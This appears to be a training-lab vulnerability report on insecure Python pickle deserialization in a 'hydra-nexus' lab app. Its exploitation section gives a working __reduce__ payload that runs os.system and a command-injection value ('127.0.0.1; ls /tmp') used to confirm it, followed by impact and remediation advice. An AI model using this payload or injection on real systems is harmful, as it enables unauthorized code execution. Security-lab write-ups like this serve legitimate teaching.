🔹 CVE ID : EDU-hydra-nexus-2026-T01-011


🔹 Title : Insecure Python Pickle Deserialization Leading to Blind Remote Code Execution in Hydra‑Nexus


🔹 Affected Lab and Component

Lab Name: hydra‑nexus


Container: websploit-hydra-nexus


Component: Data Deserialization Service


Endpoint: /api/data



Technology: Python (pickle module)

Authentication: Not required


🔹 Vulnerability Classification
CWE:

CWE‑502 – Deserialization of Untrusted Data


OWASP Top 10:
A08:2021 – Software and Data Integrity Failures



🔹 CVSS v3.1 Score

Score: 9.8 (Critical)


Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H



🔹 Description

The Hydra‑Nexus application exposes a data deserialization endpoint that accepts user‑supplied Base64‑encoded Python pickle objects and directly deserializes them using the pickle.loads() function without validation or integrity checks.
Because Python pickle objects can execute arbitrary code during deserialization via special methods such as __reduce__, an unauthenticated attacker can craft a malicious pickle payload to execute arbitrary operating system commands on the server.
The application suppresses command output and only returns the deserialized object, resulting in a blind remote code execution condition. However, successful exploitation is confirmed through observable side effects on the system.

🔹 Exploitation Steps

Navigate to the vulnerable endpoint:

 http://10.6.6.30:5010/api/data


Generate a malicious Python pickle payload on the attacker machine:

 import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("touch /tmp/owned_by_pickle",))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())

Copy the generated Base64‑encoded payload.
Paste the payload into the deserialization input field and submit the request.
The application responds with a successful deserialization result (return value 0), indicating execution without displaying command output.
Verify code execution by leveraging another available vulnerability (e.g., command injection) to list the /tmp directory:
 127.0.0.1; ls /tmp
Observe the presence of the file owned_by_pickle, confirming successful command execution.

🔹 Proof of Concept (PoC)

Malicious Pickle Payload (Base64‑encoded):
gASV...

Verification Command:
GET /tools/ping?ip=127.0.0.1; ls /tmp

Result:
owned_by_pickle


🔹 Impact

Successful exploitation allows an unauthenticated attacker to:
Execute arbitrary OS commands on the server
Gain full control of the application container
Access or modify sensitive files and credentials
Establish persistence or lateral movement
Completely compromise confidentiality, integrity, and availability
This represents a full system compromise.

🔹 Remediation

Never deserialize untrusted data using pickle
Replace pickle with safe serialization formats such as:
JSON
Protocol Buffers (with strict schemas)

If deserialization is unavoidable:
Implement cryptographic signing of serialized objects
Enforce strict type validation
Restrict endpoint access with authentication and authorization


Run application services with least‑privilege permissions


🔹 Discovered By Team 1 


🔹 Date : 01/02/2026
